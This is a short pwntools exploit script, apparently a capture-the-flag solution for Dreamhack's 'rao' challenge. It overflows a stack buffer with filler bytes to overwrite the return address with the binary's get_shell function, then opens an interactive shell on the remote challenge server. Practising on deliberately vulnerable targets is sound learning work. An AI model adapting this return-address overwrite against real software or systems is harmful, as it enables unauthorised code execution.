#! /usr/bin/python3

from pwn import *

p = remote('host3.dreamhack.games', 21657)

elf = ELF('./rao')
get_shell = elf.symbols['get_shell']

payload = b'A'*0x30
payload += b'B'*0x8
payload += p64(get_shell)

p.sendline(payload)

p.interactive()
